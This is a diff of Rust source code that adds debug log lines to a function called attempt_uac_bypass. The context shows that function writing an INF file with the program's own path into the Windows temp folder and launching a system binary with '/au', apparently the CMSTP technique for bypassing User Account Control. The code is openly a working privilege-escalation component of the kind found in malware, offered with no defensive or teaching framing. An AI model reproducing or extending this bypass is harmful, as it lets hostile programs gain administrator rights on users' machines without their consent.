@@ -39,6 +39,8 @@ ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 "#;
 
+use crate::log_debug;
+
 pub fn attempt_uac_bypass() -> bool {
     let exe_path = match env::current_exe() {
         Ok(path) => path.to_string_lossy().to_string(),
@@ -48,6 +50,9 @@ pub fn attempt_uac_bypass() -> bool {
     let temp_dir = r"C:\windows\temp";
     let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
     let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", &format!("\"{}\"", exe_path));
+
+    log_debug!("[UAC] Creating INF file: {}", random_file_name);
+    log_debug!("[UAC] Target exe: {}", exe_path);
 
     if File::create(&random_file_name)
         .and_then(|mut file| file.write_all(inf_data.as_bytes()))
@@ -59,6 +64,8 @@ pub fn attempt_uac_bypass() -> bool {
         let _ = std::fs::remove_file(&random_file_name);
         return false;
     }
+
+    log_debug!("[UAC] Running: {} /au {}", binary_path, random_file_name);
 
     let mut child = match Command::new(binary_path)
         .arg("/au")
